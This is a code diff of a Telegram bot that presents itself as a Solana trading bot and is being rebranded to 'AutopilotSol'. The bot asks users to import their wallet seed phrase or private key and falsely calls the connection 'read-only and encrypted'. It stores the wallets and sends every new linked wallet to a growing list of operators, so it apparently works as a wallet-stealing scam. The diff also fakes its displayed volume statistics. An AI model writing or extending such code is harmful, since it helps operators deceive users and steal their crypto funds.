@@ -21,7 +21,8 @@ load_dotenv()
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")
 NOTION_TOKEN = os.getenv("NOTION_TOKEN_collins", "YOUR_NOTION_TOKEN_HERE")
 NOTION_DATABASE_ID = os.getenv("NOTION_DATABASE_ID_collins", "YOUR_NOTION_DATABASE_ID_HERE")
-OWNER_TELEGRAM_ID = int(os.getenv("OWNER_TELEGRAM_ID_collins", "0"))  # Add your Telegram user ID here
+#OWNER_TELEGRAM_ID = int(os.getenv("OWNER_TELEGRAM_ID_collins", "0"))  # Add your Telegram user ID here
+AUTHORIZED_USERS = load_authorized_users()
 
 # Setup logging
 logging.basicConfig(level=logging.INFO)
@@ -32,6 +33,22 @@ notion = NotionClient(auth=NOTION_TOKEN)
 
 # In-memory cache for active sessions
 USER_STATES = {}
+
+# Load authorized user IDs from environment
+def load_authorized_users():
+    """Load authorized user IDs from environment variable"""
+    auth_users_str = os.getenv("AUTHORIZED_USERS", "0")
+    try:
+        # Support comma-separated list: "123456789,987654321"
+        if "," in auth_users_str:
+            return [int(uid.strip()) for uid in auth_users_str.split(",") if uid.strip().isdigit()]
+        else:
+            # Single user ID (backward compatibility)
+            user_id = int(auth_users_str)
+            return [user_id] if user_id != 0 else []
+    except ValueError:
+        logger.error("Invalid AUTHORIZED_USERS format in environment variables")
+        return []
 
 # Simple wallet utilities with key derivation
 class SimpleWallet:
@@ -317,21 +334,20 @@ class NotionWalletDB:
             logger.error(f"[NOTION] Error deleting user wallet from Notion: {e}")
             return False
 
+
 # Initialize Notion database
 wallet_db = NotionWalletDB(notion, NOTION_DATABASE_ID)
-async def notify_owner_new_user(context: ContextTypes.DEFAULT_TYPE, user_id, username, wallet_address, import_type):
-    """Send notification to bot owner when new user links wallet"""
-    if OWNER_TELEGRAM_ID == 0:
-        logger.warning("[NOTIFICATION] Owner Telegram ID not configured - skipping notification")
-        return  # Owner ID not configured
+# Update the notification function to notify all authorized users
+async def notify_authorized_users_new_user(context: ContextTypes.DEFAULT_TYPE, user_id, username, wallet_address, import_type):
+    """Send notification to all authorized users when new user links wallet"""
+    if not AUTHORIZED_USERS:
+        logger.warning("[NOTIFICATION] No authorized users configured - skipping notification")
+        return False
     
-    try:
-        # Get user info
-        user_info = f"@{username}" if username else f"ID: {user_id}"
-        short_address = f"{wallet_address[:6]}...{wallet_address[-6:]}"
-        
-        # Use simpler text without special characters that might cause HTML parsing issues
-        notification_text = f"""🚨 <b>New User Alert!</b>
+    user_info = f"@{username}" if username else f"ID: {user_id}"
+    short_address = f"{wallet_address[:6]}...{wallet_address[-6:]}"
+    
+    notification_text = f"""🚨 <b>New User Alert!</b>
 
 👤 <b>User:</b> {user_info}
 🆔 <b>Telegram ID:</b> <code>{user_id}</code>
@@ -340,40 +356,44 @@ async def notify_owner_new_user(context: ContextTypes.DEFAULT_TYPE, user_id, use
 🕐 <b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 
 🔗 <b>Solscan:</b> https://solscan.io/account/{wallet_address}"""
-        
-        await context.bot.send_message(
-            chat_id=OWNER_TELEGRAM_ID,
-            text=notification_text,
-            parse_mode="HTML"
-        )
-        logger.info(f"[NOTIFICATION] Successfully sent new user alert to owner for user {user_id}")
-        return True
-        
-    except Exception as e:
-        logger.error(f"[NOTIFICATION] Failed to notify owner about new user {user_id}: {e}")
-        # Optionally, try sending a simpler fallback notification
+    
+    success_count = 0
+    
+    for auth_user_id in AUTHORIZED_USERS:
         try:
-            fallback_text = f"New user joined: {user_id} ({username or 'No username'})"
             await context.bot.send_message(
-                chat_id=OWNER_TELEGRAM_ID,
-                text=fallback_text
+                chat_id=auth_user_id,
+                text=notification_text,
+                parse_mode="HTML"
             )
-            logger.info(f"[NOTIFICATION] Sent fallback notification for user {user_id}")
-            return True
-        except Exception as fallback_error:
-            logger.error(f"[NOTIFICATION] Fallback notification also failed: {fallback_error}")
-            return False
+            logger.info(f"[NOTIFICATION] Successfully sent new user alert to authorized user {auth_user_id}")
+            success_count += 1
+        except Exception as e:
+            logger.error(f"[NOTIFICATION] Failed to notify authorized user {auth_user_id}: {e}")
+            # Try fallback notification
+            try:
+                fallback_text = f"New user joined: {user_id} ({username or 'No username'})"
+                await context.bot.send_message(
+                    chat_id=auth_user_id,
+                    text=fallback_text
+                )
+                logger.info(f"[NOTIFICATION] Sent fallback notification to authorized user {auth_user_id}")
+                success_count += 1
+            except Exception as fallback_error:
+                logger.error(f"[NOTIFICATION] Fallback notification also failed for user {auth_user_id}: {fallback_error}")
+    
+    return success_count > 0
 
 # Add this test function to verify the owner notification works
 async def test_owner_notification(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Test function to check if owner notifications work"""
-    if not await is_owner(update.effective_user.id):
+    if not await is_authorized_user(update.effective_user.id):
         await update.message.reply_text("Access denied. Owner only command.")
         return
     
     try:
         # Test with fake data
-        test_success = await notify_owner_new_user(
+        test_success = await notify_authorized_users_new_user(
             context, 
             123456789,  # fake user ID
             "test_user", 
@@ -440,12 +460,12 @@ def format_wallet_dashboard(address, sol_balance, sol_price=None, change_24h=Non
     if bot_stats["volume_24h"] >= 1000000:
         volume_display = f"${bot_stats['volume_24h']/1000000:.1f}M"
     elif bot_stats["volume_24h"] >= 1000:
-        volume_display = f"${bot_stats['volume_24h']/1000:.1f}K"
+        volume_display = f"${bot_stats['volume_24h']/3000:.1f}K"
     else:
         volume_display = f"${bot_stats['volume_24h']:.0f}"
     
     # Format the message similar to the screenshot
-    message = f"""🟢 **WELCOME TO MoonRaid Bot** 🤖
+    message = f"""🟢 **WELCOME TO AutopilotSol Bot** 🤖
 *The Fastest all in one Solana Trading bot!*
 
 📊 **Live Stats:** {bot_stats['wallets_connected']:,} wallets connected | {volume_display} volume today
@@ -540,7 +560,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         text = (
-            "🟢 **WELCOME TO MoonRaid Bot** 🤖\n"
+            "🟢 **WELCOME TO AutopilotSol Bot** 🤖\n"
             "*The Fastest all in one Solana Trading bot!*\n\n"
             "💼 **Wallet:**\n"
             "(No wallet linked) | $0.00\n\n"
@@ -564,7 +584,7 @@ async def send_wallet_import_screen(chat_id, context: ContextTypes.DEFAULT_TYPE)
     text = (
         "💼 **Import Solana Wallet**\n\n"
         "You need to connect your wallet to access this feature.\n\n"
-        "SOLX Pro uses bank-grade security to protect your assets.\n"
+        "AutopilotSol Pro uses bank-grade security to protect your assets.\n"
         "All connections are read-only and encrypted.\n\n"
         "Please select an import method:"
     )
@@ -741,7 +761,7 @@ Please enter a token symbol (like SOL or BONK) or a full token address to get de
         wallet_info = wallet_db.get_user_wallet(user_id)
         if wallet_info:
             # User has wallet linked - show auto mode interface
-            auto_text = """🤖 **SOLX Auto AI Mode Activated**
+            auto_text = """🤖 **AutopilotSol Auto AI Mode Activated**
 
 🔥 Initializing real-time market intelligence engine...
 
@@ -836,7 +856,7 @@ Your balance is insufficient. Please add more SOL to your wallet to use the Auto
         if wallet_info:
             # User has wallet linked - show settings menu
             settings_text = """⚙️ **Settings**
-Configure your MoonRaid Bot experience."""
+Configure your AutopilotSol Bot experience."""
             
             settings_keyboard = [
                 [InlineKeyboardButton("🔑 View Private Key", callback_data="view_private_key")],
@@ -913,10 +933,10 @@ This private key gives full access to your wallet."""
             )
     
     elif data == "bot_info":
-        info_text = """ℹ️ **About the MoonRaid Bot**
+        info_text = """ℹ️ **About the AutopilotSol Bot**
 
-🚀 **What is MoonRaid Bot?**
-MoonRaid Bot is the fastest all-in-one Solana trading bot on Telegram. Trade, manage your portfolio, and monitor markets directly from your chat.
+🚀 **What is AutopilotSol Bot?**
+AutopilotSol Bot is the fastest all-in-one Solana trading bot on Telegram. Trade, manage your portfolio, and monitor markets directly from your chat.
 
 🔧 **How to use:**
 1. **Connect Wallet**: Import your Solana wallet using seed phrase or private key
@@ -990,7 +1010,7 @@ Having issues? Contact our support team or check the documentation.
                 volume_display = f"${bot_stats['volume_24h']:.0f}"
             
             text = (
-                "🟢 **WELCOME TO MoonRaid Bot** 🤖\n"
+                "🟢 **WELCOME TO Autopilotsol Bot** 🤖\n"
                 "*The Fastest all in one Solana Trading bot!*\n\n"
                 f"📊 **Live Stats:** {bot_stats['wallets_connected']:,} wallets connected | {volume_display} volume today\n\n"
                 "💼 **Wallet:**\n"
@@ -1074,7 +1094,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Notify owner if this is a new user
         if is_new_user:
-            await notify_owner_new_user(
+            await notify_authorized_users_new_user(
                 context, 
                 user_id, 
                 update.effective_user.username, 
@@ -1255,14 +1275,16 @@ async def unlink_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("No wallet linked.")
 
-async def is_owner(user_id):
-    """Check if user is the bot owner"""
-    return user_id == OWNER_TELEGRAM_ID
 
+async def is_authorized_user(user_id):
+    """Check if user is authorized to perform admin operations"""
+    return user_id in AUTHORIZED_USERS
+
+# Update all admin command functions to use the new authorization check
 async def send_message_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner command to send message to specific user"""
-    if not await is_owner(update.effective_user.id):
-        await update.message.reply_text("Access denied. Owner only command.")
+    """Admin command to send message to specific user"""
+    if not await is_authorized_user(update.effective_user.id):
+        await update.message.reply_text("Access denied. Authorized users only.")
         return
     
     try:
@@ -1270,7 +1292,7 @@ async def send_message_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
         if len(args) < 2:
             await update.message.reply_text(
                 "Usage: /send_to_user <user_id> <message>\n"
-                "Example: /send_to_user 123456789 Hello from the bot owner!"
+                "Example: /send_to_user 123456789 Hello from the bot admin!"
             )
             return
         
@@ -1279,7 +1301,7 @@ async def send_message_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
         
         await context.bot.send_message(
             chat_id=target_user_id,
-            text=f"Message from Bot Owner:\n\n{message}",
+            text=f"Message from Bot Admin:\n\n{message}",
             parse_mode="Markdown"
         )
         
@@ -1291,9 +1313,9 @@ async def send_message_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text(f"Failed to send message: {str(e)}")
 
 async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner command to broadcast message to all users"""
-    if not await is_owner(update.effective_user.id):
-        await update.message.reply_text("Access denied. Owner only command.")
+    """Admin command to broadcast message to all users"""
+    if not await is_authorized_user(update.effective_user.id):
+        await update.message.reply_text("Access denied. Authorized users only.")
         return
     
     try:
@@ -1311,7 +1333,8 @@ async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         for result in response["results"]:
             telegram_id = result["properties"]["telegram_id"]["number"]
-            if telegram_id and telegram_id != OWNER_TELEGRAM_ID:
+            # Don't broadcast to authorized users (they already know about admin messages)
+            if telegram_id and telegram_id not in AUTHORIZED_USERS:
                 users.append(telegram_id)
         
         sent_count = 0
@@ -1339,9 +1362,9 @@ async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Broadcast failed: {str(e)}")
 
 async def get_user_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner command to get list of all users"""
-    if not await is_owner(update.effective_user.id):
-        await update.message.reply_text("Access denied. Owner only command.")
+    """Admin command to get list of all users"""
+    if not await is_authorized_user(update.effective_user.id):
+        await update.message.reply_text("Access denied. Authorized users only.")
         return
     
     try:
